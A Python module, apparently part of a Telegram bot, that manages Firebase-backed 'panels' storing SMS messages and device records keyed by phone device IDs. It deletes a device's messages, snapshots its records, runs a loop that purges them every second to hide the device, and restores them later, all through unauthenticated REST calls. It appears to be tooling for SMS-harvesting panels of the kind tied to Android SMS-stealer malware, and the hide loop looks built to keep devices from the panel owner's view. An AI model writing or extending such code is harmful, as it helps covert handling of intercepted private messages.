"""Firebase panel admin: delete SMS, hide device loop, restore snapshot."""

from __future__ import annotations

import asyncio
import logging
from typing import Any

import httpx

from app.database import Device, MonitorProfile
from app.firebase_client import _fetch_json, firebase_root_url, normalize_firebase_url
from app.firebase_sync import _get_http_client, register_device_on_firebase, resolve_firebase_url
from app.firebase_sms_sync import clear_sms_baseline
from app.services import get_device_by_identifier, get_monitor_profile, search_devices

logger = logging.getLogger(__name__)

HIDE_INTERVAL_SEC = 1.0
_HIDE_STOP: dict[str, asyncio.Event] = {}
_HIDE_TASKS: dict[str, asyncio.Task[None]] = {}
_HIDE_SNAPSHOTS: dict[str, dict[str, Any]] = {}

_DEVICE_NODE_PATHS = (
    "devices",
    "clients",
    "device",
    "users",
    "phones",
)


def _norm_device_id(device_id: str) -> str:
    return (device_id or "").strip()


def hide_active(device_id: str) -> bool:
    key = _norm_device_id(device_id)
    task = _HIDE_TASKS.get(key)
    return task is not None and not task.done()


async def _firebase_delete(url: str, *, timeout: float = 2.0) -> bool:
    client = _get_http_client()
    try:
        response = await client.delete(f"{url}.json", timeout=timeout)
        return response.status_code in (200, 404)
    except httpx.HTTPError as exc:
        logger.debug("Firebase DELETE failed %s: %s", url, exc)
        return False


async def _firebase_get_dict(url: str, *, timeout: float = 2.0) -> dict | None:
    try:
        data = await _fetch_json(f"{url}.json", timeout=timeout)
    except httpx.HTTPError:
        return None
    return data if isinstance(data, dict) else None


def _resolve_panel_url(profile: MonitorProfile | None, device: Device | None) -> str | None:
    if device and device.firebase_source_url:
        return normalize_firebase_url(device.firebase_source_url)
    if profile:
        url = resolve_firebase_url(profile, device)
        if url:
            return normalize_firebase_url(url)
        if profile.firebase_url:
            return normalize_firebase_url(profile.firebase_url)
    return None


async def resolve_admin_device(
    db,
    telegram_user_id: int,
    device_id: str,
) -> tuple[Device | None, MonitorProfile, str]:
    """DB device if known; panel URL from device or profile."""
    from app.services import find_device_in_firebase_url

    from app.services import get_or_create_monitor_profile

    profile = get_monitor_profile(db, telegram_user_id) or get_or_create_monitor_profile(
        db, telegram_user_id
    )

    query = _norm_device_id(device_id)
    device = get_device_by_identifier(db, query)
    if not device:
        matches = search_devices(db, query, limit=1)
        device = matches[0] if matches else None

    panel = _resolve_panel_url(profile, device)
    if not panel and profile.firebase_url:
        live = await find_device_in_firebase_url(db, query, profile.firebase_url)
        if live:
            device = live
            panel = _resolve_panel_url(profile, device)

    if not panel:
        raise ValueError("Firebase panel nahi mila — pehle /a ya /setfirebase karo")

    if not device:
        device = Device(name=query, firebase_source_url=panel)
    elif not device.firebase_source_url:
        device.firebase_source_url = panel

    return device, profile, panel


async def delete_device_sms_on_panel(panel_url: str, device_id: str, *, db=None, device: Device | None = None) -> int:
    """Remove all messages/{device_id} on Firebase; clear bot SMS baseline."""
    root = firebase_root_url(panel_url)
    device_id = _norm_device_id(device_id)
    ok = await _firebase_delete(f"{root}/messages/{device_id}")
    if device and db is not None:
        clear_sms_baseline(device)
        db.commit()
    return 1 if ok else 0


async def _snapshot_device_nodes(root: str, device_id: str) -> dict[str, Any]:
    snap: dict[str, Any] = {}
    for collection in _DEVICE_NODE_PATHS:
        data = await _firebase_get_dict(f"{root}/{collection}/{device_id}")
        if data:
            snap[collection] = data
    leaf = await _firebase_get_dict(f"{root}/{device_id}")
    if leaf:
        snap["_root"] = leaf
    return snap


async def _purge_device_nodes(root: str, device_id: str) -> int:
    removed = 0
    for collection in _DEVICE_NODE_PATHS:
        if await _firebase_delete(f"{root}/{collection}/{device_id}"):
            removed += 1
    if await _firebase_delete(f"{root}/{device_id}"):
        removed += 1
    return removed


async def _hide_loop(panel_url: str, device_id: str, stop: asyncio.Event) -> None:
    root = firebase_root_url(panel_url)
    device_id = _norm_device_id(device_id)
    logger.info("Firebase hide loop started device=%s panel=%s", device_id, root)
    try:
        while not stop.is_set():
            await _purge_device_nodes(root, device_id)
            try:
                await asyncio.wait_for(stop.wait(), timeout=HIDE_INTERVAL_SEC)
                break
            except asyncio.TimeoutError:
                continue
    finally:
        logger.info("Firebase hide loop stopped device=%s", device_id)


async def start_hide_device(panel_url: str, device_id: str) -> str:
    device_id = _norm_device_id(device_id)
    if hide_active(device_id):
        return "already"

    root = firebase_root_url(panel_url)
    _HIDE_SNAPSHOTS[device_id] = await _snapshot_device_nodes(root, device_id)

    stop = asyncio.Event()
    _HIDE_STOP[device_id] = stop
    _HIDE_TASKS[device_id] = asyncio.create_task(_hide_loop(panel_url, device_id, stop))
    return "started"


async def stop_hide_device(device_id: str) -> bool:
    device_id = _norm_device_id(device_id)
    stop = _HIDE_STOP.pop(device_id, None)
    task = _HIDE_TASKS.pop(device_id, None)
    if stop:
        stop.set()
    if task:
        try:
            await asyncio.wait_for(task, timeout=3.0)
        except (asyncio.TimeoutError, asyncio.CancelledError):
            task.cancel()
    return stop is not None


async def restore_device_on_panel(
    panel_url: str,
    device_id: str,
    profile: MonitorProfile,
    device: Device,
) -> int:
    """Stop hide loop and PUT device nodes back on Firebase."""
    device_id = _norm_device_id(device_id)
    await stop_hide_device(device_id)

    root = firebase_root_url(panel_url)
    restored = 0
    snap = _HIDE_SNAPSHOTS.pop(device_id, None)
    client = _get_http_client()

    if snap:
        for collection, data in snap.items():
            if collection == "_root":
                url = f"{root}/{device_id}.json"
            else:
                url = f"{root}/{collection}/{device_id}.json"
            try:
                response = await client.put(url, json=data, timeout=3.0)
                if response.status_code == 200:
                    restored += 1
            except httpx.HTTPError as exc:
                logger.warning("Restore PUT failed %s: %s", url, exc)
    else:
        try:
            await register_device_on_firebase(panel_url, device, profile)
            restored = 1
        except Exception as exc:
            logger.warning("Restore register failed device=%s: %s", device_id, exc)

    return restored